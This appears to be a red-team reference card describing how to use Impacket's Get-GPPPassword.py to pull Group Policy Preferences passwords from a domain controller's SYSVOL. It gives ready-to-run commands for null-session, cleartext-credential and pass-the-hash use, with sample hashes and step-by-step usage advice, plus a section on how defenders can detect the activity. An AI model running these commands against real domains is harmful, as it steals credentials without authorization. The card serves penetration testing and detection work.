---
id: 0b2edd87-cf2d-4345-9173-d0b9a66f43a1
name: Impacket Get GPP Password Variations
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:03.530177+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - impacket
  - gpp
  - credential-access
validated: true
---

# Impacket Get GPP Password Variations

## Code

```bash
# with a NULL session
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

# with cleartext credentials
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash
Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAIN_CONTROLLER'
```

## Description

This code snippet provides three variations of the Impacket Get-GPPPassword.py command for extracting Group Policy Preferences passwords from SYSVOL, supporting null sessions, cleartext authentication, and pass-the-hash techniques.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| DOMAIN_CONTROLLER | FQDN or IP of domain controller | dc01.domain.com |
| DOMAIN | Active Directory domain | DOMAIN |
| USER | Domain username | user |
| PASSWORD | Cleartext password | password123 |
| LMhash | LM hash (often empty) | aad3b435b51404eeaad3b435b51404ee |
| NThash | NTLM hash | 8846f7eaee8fb117ad06bdd830b7586c |

## Usage

Save as a bash script or run individually in a terminal with Impacket installed. Use null session first for opportunistic access; fall back to authenticated methods. Ideal in red team engagements targeting legacy AD environments with exposed GPP files.

## Detection

- Network: SMB connections (445/TCP) to DCs from unusual IPs; monitor with Zeek or Windows Firewall logs.
- Host: Process creation of python.exe running Get-GPPPassword.py; enable PowerShell/CLI logging.
- File: Access to SYSVOL\Policies\{GUID}\Preferences\*.xml; audit file reads via Event ID 4663.

## Related

- [[procedures/Automated-Password-Extraction-from-SYSVOL-and-Group-Policy-Preferences]]
- [[tools/Impacket]]
